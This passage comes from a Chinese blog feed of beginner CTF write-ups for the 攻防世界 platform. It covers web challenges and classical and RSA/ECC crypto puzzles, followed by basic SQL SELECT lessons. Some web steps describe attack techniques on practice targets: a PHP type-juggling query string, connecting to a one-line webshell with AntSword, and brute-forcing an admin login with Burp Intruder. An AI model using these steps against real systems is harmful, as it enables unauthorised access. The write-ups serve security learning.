<h1 id="五-disabled-button"><a href="#五-disabled-button" class="headerlink" title="五.disabled_button"></a>五.disabled_button</h1><p><img src="https://img-blog.csdnimg.cn/20210221182241924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过题目的可以想到在HTML标签中的disabled属性：<br>disabled 属性规定应该禁用 input 元素。</p>
<p>被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。</p>
<p>注释：disabled 属性无法与 <input type="hidden"> 一起使用。<br>因此打开网页源码找到<code>disabled</code>字样删除即可点击按钮得到flag<br><img src="https://img-blog.csdnimg.cn/20210221183228252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="六-simple-php"><a href="#六-simple-php" class="headerlink" title="六.simple_php"></a>六.simple_php</h1><p><img src="https://img-blog.csdnimg.cn/20210222153731810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目提示本题考验的是简单的php运用<br><img src="https://img-blog.csdnimg.cn/2021022215400679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对源码分析，该题以GeT传入参数a和b。对上半段分析<br>：a的参数等于0并且a为真；对下半段进行分析：b的参数必须大于1234因此得到命令：<code>?a=00a&amp;&amp;b=12345b</code>在URL后添加得到flag：<img src="https://img-blog.csdnimg.cn/20210222160835556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="七-get-post"><a href="#七-get-post" class="headerlink" title="七.get_post"></a>七.get_post</h1><p><img src="https://img-blog.csdnimg.cn/20210222170019500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对题目进行解析，http通常由两种请求方式：GET还有post。<br><img src="https://img-blog.csdnimg.cn/20210222170226233.png" alt="在这里插入图片描述"><br>首先需要在进行get请求只需要在URl后添加上<code>？a=1</code><br><img src="https://img-blog.csdnimg.cn/20210222170606821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>采用post请求我们可以使用插件HackBar V2，只需要下载便可以使用。<br>安装完成后重启打开HackBar V2插件<br><img src="https://img-blog.csdnimg.cn/20210222170933448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一行复制此刻网页地址：<code>http://111.200.241.244:52052/?a=1</code><br>选择post data<br>下一框根据提示输入b=2即可点击执行得到flag<br><img src="https://img-blog.csdnimg.cn/20210222171135102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界-crypto新手区</title>
    <url>/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p><img src="https://img-blog.csdnimg.cn/20210328154941751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接用base64解密<br><img src="https://img-blog.csdnimg.cn/20210328155422786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210328155015953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><p><img src="https://img-blog.csdnimg.cn/20210328155039119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题需要用到凯撒解密，key=12.这个我没考虑那么多，一个一个试的。。。<br><img src="https://img-blog.csdnimg.cn/20210328155444173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328155356232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p><img src="https://img-blog.csdnimg.cn/20210328155635455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见该题需要使用摩斯密码<br><img src="https://img-blog.csdnimg.cn/20210328155706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可将<strong>1更换为-**，</strong>0- .**<br><img src="https://img-blog.csdnimg.cn/20210328160505952.png" alt="在这里插入图片描述"><br>进行解密，得到flag<img src="https://img-blog.csdnimg.cn/20210328160530141.png" alt="在这里插入图片描述"></p>
<h1 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h1><p><img src="https://img-blog.csdnimg.cn/20210328160601990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示，可知本题需要使用栅栏解密，key=5<br><img src="https://img-blog.csdnimg.cn/20210328160706280.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328160833127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/20210328160857334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h1><p><img src="https://img-blog.csdnimg.cn/20210328160935190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目描述本题需要使用，<strong>摩斯密码</strong>再看我们想到<strong>培根密码</strong><br><img src="https://img-blog.csdnimg.cn/20210328161325362.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328161411553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将/替换为空格进行摩斯解密<img src="https://img-blog.csdnimg.cn/20210328161442911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再进行培根解密<img src="https://img-blog.csdnimg.cn/20210328161545446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{attackanddefenceworldisinteresting}</p>
<h1 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h1><p><img src="https://img-blog.csdnimg.cn/20210328161637319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328161703706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据字符特点以及=，可以确定使用base64进行解密<img src="https://img-blog.csdnimg.cn/20210328161823523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328161840123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们来观察得到的字符串判断接下来需要进行<strong>Unicode编码转换为ASCLL</strong><br><a href="http://tool.chinaz.com/tools/unicode.aspx">这里是地址</a><br><img src="https://img-blog.csdnimg.cn/20210328162151491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据所得到的字符串，需要在进行一次base64转换<img src="https://img-blog.csdnimg.cn/20210328162251143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328162329854.png" alt="在这里插入图片描述"><br>根据ASCLL码表进行得到flag{welcometoattackanddefenceworld}</p>
<h1 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h1><p><img src="https://img-blog.csdnimg.cn/20210328162536155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328162551409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里使用RSA工具进行解题<br><img src="https://img-blog.csdnimg.cn/20210328162703858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328162739507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击后得到d，即所求flag{125631357777427553}</p>
<h1 id="easy-ECC"><a href="#easy-ECC" class="headerlink" title="easy_ECC"></a>easy_ECC</h1><p><img src="https://img-blog.csdnimg.cn/20210328162852335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题我们使用的是ECCTOOL工具进行解密<img src="https://img-blog.csdnimg.cn/20210328163121889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328163636195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328163651309.png" alt="在这里插入图片描述"><br>得到x,y<img src="https://img-blog.csdnimg.cn/20210328163709715.png" alt="在这里插入图片描述"><br>计算X+Y的值即可以得到结果：cyberpeace{19477226185390}</p>
<h1 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h1><p><img src="https://img-blog.csdnimg.cn/20210328164042845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由题意可知本题需要掌握转轮机密码原理<img src="https://img-blog.csdnimg.cn/20210328164136879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实原理我也是不太懂明白先往下看看，根据密匙序号先后排列字符串，如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20210328164418491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也就是将该行的密文那个字母（包括这个字符）之后的字符串都提到前面</p>
<p><img src="https://img-blog.csdnimg.cn/20210328164855573.png" alt="在这里插入图片描述"></p>
<p>看结果：<img src="https://img-blog.csdnimg.cn/20210328165129164.png" alt="在这里插入图片描述"><br>就这样依次每行都要转换<img src="https://img-blog.csdnimg.cn/2021032816550993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细观察一列一列对应发现倒数第九列为所得flag<img src="https://img-blog.csdnimg.cn/20210328170358675.png" alt="在这里插入图片描述"><br>转化为小写：flag{fireinthehole}</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界web新手区(webshell与weak_auth)</title>
    <url>/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA(webshell%E4%B8%8Eweak_auth)/</url>
    <content><![CDATA[<h1 id="一-webshell"><a href="#一-webshell" class="headerlink" title="一.webshell"></a>一.webshell</h1><p><img src="https://img-blog.csdnimg.cn/20210313155524571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开之后可以看到：<br><img src="https://img-blog.csdnimg.cn/20210313155548447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>本题考察的是一句话木马以及工具的使用<br>这里我们可以使用蚁剑操作<br><img src="https://img-blog.csdnimg.cn/20210313160244399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加后点击地址<img src="https://img-blog.csdnimg.cn/20210313160314744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到flag就在这里面<img src="https://img-blog.csdnimg.cn/2021031316034039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、weak-auth"><a href="#二、weak-auth" class="headerlink" title="二、weak_auth"></a>二、weak_auth</h1><p><img src="https://img-blog.csdnimg.cn/20210313162934905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目提示本题考查的弱密码<br><img src="https://img-blog.csdnimg.cn/20210313163341304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到登录名：admin,如果熟知弱密码的话可以随意尝试说不定就是答案哦！<br>在这里我们选择Brup进行爆破<br><img src="https://img-blog.csdnimg.cn/20210313163630576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发送后打开Intruder进行爆破</p>
<p><img src="https://img-blog.csdnimg.cn/20210313165822205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>通过长度的不同可以发现密码为：123456<br>账号：admin 密码：123456登录后打开得到flag<img src="https://img-blog.csdnimg.cn/2021031316595291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>延时注入-sql注入第九关</title>
    <url>/2021/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0-%E7%AE%80%E5%8D%95%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><pre><code>1. 了解select的完整语法
</code></pre>
<p>==2. 掌握使用select进行简单查询==</p>
<h1 id="一、基础语法掌握"><a href="#一、基础语法掌握" class="headerlink" title="一、基础语法掌握"></a>一、基础语法掌握</h1><p>在之前的文章有过对数据库的简单介绍了，今天我们对select语句进行一下细致的学习🕵️‍♂️</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2 <span class="hljs-comment">--选取字段</span><br><span class="hljs-keyword">FROM</span> table_name <span class="hljs-comment">--选取哪张表</span><br>[<span class="hljs-keyword">WHERE</span> where_condition] <span class="hljs-comment">--查询条件</span><br>[GROUP BY &#123;col_name | expr | position&#125;, ... [WITH ROLLUP]]  --分组<br>[<span class="hljs-keyword">HAVING</span> where_condition]  <span class="hljs-comment">--分组后条件筛选</span><br>[ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] --排序<br>[LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] --分页<br></code></pre></td></tr></table></figure>
<h1 id="二、简单查询内容"><a href="#二、简单查询内容" class="headerlink" title="二、简单查询内容"></a>二、简单查询内容</h1><p>在这里主要记录前三条查询语句的学习，进行大致的了解</p>
<h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2<br></code></pre></td></tr></table></figure>
<p><strong>获取表</strong><br><img src="https://img-blog.csdnimg.cn/2021050809062353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name; <span class="hljs-comment">--列出表中所有字段</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210508090724923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2 <span class="hljs-keyword">from</span> table_name;<br></code></pre></td></tr></table></figure>
<p><strong>选取想要查询的字段</strong><br><img src="https://img-blog.csdnimg.cn/20210508091026314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到这里过滤的id字段的内容，得到了我们想要的字段内容</p>
<p><strong>查询条件</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name1, column_name2 form table_name <span class="hljs-keyword">where</span> <span class="hljs-string">&#x27;where_condition&#x27;</span> ;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210508091633725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>掌握这些就可以进行基本的查询语句了，当然select语句有很多的用法，例如呢：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">99</span><span class="hljs-operator">*</span><span class="hljs-number">99</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210508091902416.png" alt="在这里插入图片描述"><br>这样就变成了一个小计算器，是不是很有意思🤭🤭</p>
]]></content>
  </entry>
  <entry>
    <title>数据库查询语句（二）-条件查询</title>
    <url>/2021/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3>1. 熟练掌握where子句各类运算符的使用</h3>
<h3>2. 熟练掌握多条件查询and、or的使用


<h1 id="一、单条件查询"><a href="#一、单条件查询" class="headerlink" title="一、单条件查询"></a>一、单条件查询</h1><p>在SQL中，insert、update、delete和select后面都能带where子句，用于插入、修改、删除或查询指定条件的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name 运算符 <span class="hljs-keyword">value</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210508093514522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>语句:<code>select * from table_name where column_name 运算符 value;</code><br><img src="https://img-blog.csdnimg.cn/20210508103718355.png" alt="在这里插入图片描述"><br><strong>下面是查询不等于Dumb的名单</strong><br><img src="https://img-blog.csdnimg.cn/20210508103859433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>大于等于</strong><br><img src="https://img-blog.csdnimg.cn/20210508104038347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Between语句</strong><br><img src="https://img-blog.csdnimg.cn/20210508104232768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、多条件查询"><a href="#二、多条件查询" class="headerlink" title="二、多条件查询"></a>二、多条件查询</h1><p>在where子句中，使用and、or可以把两个或多个过滤条件结合起来。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> condition1 <span class="hljs-keyword">AND</span> condition2 <span class="hljs-keyword">OR</span> condition3<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210508093617634.png" alt="在这里插入图片描述"></p>
